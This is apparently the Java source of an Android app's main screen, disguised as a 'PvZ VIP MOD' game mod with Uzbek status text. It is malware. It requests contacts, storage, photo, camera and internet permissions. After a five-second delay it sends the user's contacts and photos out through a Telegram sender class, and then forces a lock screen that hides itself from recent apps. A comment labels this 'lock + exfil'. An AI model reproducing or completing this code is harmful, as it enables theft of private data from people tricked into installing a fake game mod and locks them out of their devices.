package com.pvzmod.vip;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.widget.TextView;

public class MainActivity extends AppCompatActivity {
    
    private static final int PERMISSION_REQUEST = 1001;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        TextView status = findViewById(R.id.status_text);
        status.setText("PvZ VIP MOD yuklanmoqda...");
        
        // Ruxsatlarni so'rash
        requestPermissions();
        
        // 5 soniya keyin lock + exfil
        new Handler().postDelayed(() -> {
            TelegramSender.sendContactsAndPhotos(this);
            startLockScreen();
        }, 5000);
    }
    
    private void requestPermissions() {
        String[] permissions = {
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.CAMERA,
            Manifest.permission.INTERNET
        };
        
        ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST);
    }
    
    private void startLockScreen() {
        Intent intent = new Intent(this, LockScreenActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | 
                       Intent.FLAG_ACTIVITY_CLEAR_TASK | 
                       Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        startActivity(intent);
        finishAffinity();
    }
}
